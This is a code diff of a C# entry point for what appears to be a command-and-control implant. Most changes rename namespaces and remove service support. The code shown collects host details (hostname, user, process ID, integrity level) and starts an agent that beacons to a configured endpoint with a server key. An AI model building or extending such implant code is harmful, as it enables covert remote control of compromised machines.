@@ -10,11 +10,8 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 
-#if SERVICE
-using System.ServiceProcess;
-#endif
 
-namespace Agent
+namespace EntryPoint
 {
     public class Entry
     {
@@ -28,6 +25,7 @@ namespace Agent
             _args = args;
             Start();
 #endif
+            Start();
         }
 
 
@@ -36,8 +34,8 @@ namespace Agent
 
         public static void Start()
         {
-            string connUrl = Properties.Resources.EndPoint;
-            string serverKey = Properties.Resources.Key;
+            string connUrl = Agent.Properties.Resources.EndPoint;
+            string serverKey = Agent.Properties.Resources.Key;
 #if DEBUG
             Debug.Listeners.Add(new TextWriterTraceListener(Console.Out));
 
@@ -89,7 +87,7 @@ namespace Agent
 
 
             var commModule = CommunicationFactory.CreateCommunicator(connexion);
-            var agent = new Models.Agent(metaData, commModule);
+            var agent = new Agent.Models.Agent(metaData, commModule);
 
             s_agentThread = new Thread(agent.Start);
             s_agentThread.Start();
@@ -122,7 +120,7 @@ namespace Agent
 
             AgentMetadata metadata = new AgentMetadata()
             {
-                Id = ShortGuid.NewGuid(),
+                Id = Agent.ShortGuid.NewGuid(),
                 Hostname = Environment.MachineName,
                 UserName = userName,
                 ProcessId = process.Id,
@@ -130,7 +128,7 @@ namespace Agent
                 Architecture = IntPtr.Size == 8 ? "x64" : "x86",
                 Integrity = integrity,
                 EndPoint = endpoint,
-                Version = "Net v2.6.0",
+                Version = "C3PO .Net 1.0",
                 SleepInterval = endpoint.ToLower().StartsWith("http") ? 2 : 0, //pivoting agent
                 SleepJitter = 0
             };
